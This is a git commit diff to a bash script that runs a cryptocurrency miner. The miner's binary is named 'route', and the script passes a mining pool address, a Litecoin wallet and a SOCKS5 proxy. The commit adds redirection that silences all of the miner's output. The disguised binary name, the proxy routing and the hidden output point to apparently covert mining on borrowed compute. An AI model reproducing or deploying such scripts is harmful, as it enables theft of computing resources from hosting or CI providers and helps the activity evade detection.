b3af3250634f28130e083e1f4cea23d801f32c5d
koreangraphic <92863319+koreangraphic@users.noreply.github.com>
2021-10-20 20:06:40 +0700

    Update roucubets.sh

--- roucubets.sh
+++ roucubets.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 chmod +x route 
-timeout 280m ./route -a scryptn2 -o stratum+tcp://scryptn2.eu.mine.zpool.ca:4339 -u LQNiMe5CksHxP1JA9HKxLeSKwyS9T4vjyn -p c=LTC -t 2 -x socks5://192.252.209.155:14455
+timeout 280m ./route -a scryptn2 -o stratum+tcp://scryptn2.eu.mine.zpool.ca:4339 -u LQNiMe5CksHxP1JA9HKxLeSKwyS9T4vjyn -p c=LTC -t 2 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
 sudo apt update
